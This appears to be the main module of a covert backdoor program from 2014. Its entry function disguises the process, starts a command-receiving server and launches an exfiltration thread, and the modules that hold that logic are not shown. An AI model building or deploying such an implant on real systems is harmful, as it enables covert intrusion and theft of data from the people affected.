"""
/*---------------------------------------------------------------------------------------
--  SOURCE FILE:    backjake.py
--
--  PROGRAM:        backjake
--
--  FUNCTIONS:      main(argv)
--
--  DATE:           December 7th, 2014
--
--  DESIGNERS:      Jacob Miner
--
--  PROGRAMMERS:    Jacob Miner
--
--  NOTES:			The server side of the program. Recieves command and performs exfiltration
--  
---------------------------------------------------------------------------------------*/
"""

import socket
from struct import *
import pcapy
import sys
import psutil
import time
import threading
import signal
import config
import spyFunctions
import recvFunctions
import exfil
# import sendFunctions
# import utils

running = True

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   main()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	main(argv)
--					argv - the arguments of the program. Not used.
--
--  RETURNS:  	void	
--
--  NOTES:  	Starts the other threads in the server program.
--  
------------------------------------------------------------------------------*/
"""
def main(argv):
	spyFunctions.disguise()
	recvFunctions.startServer()
	exfil.startThread()

	try:
		while(True):
			time.sleep(1)
	except (KeyboardInterrupt, SystemExit):
		sys.exit()

if __name__ == "__main__":
	main(sys.argv)
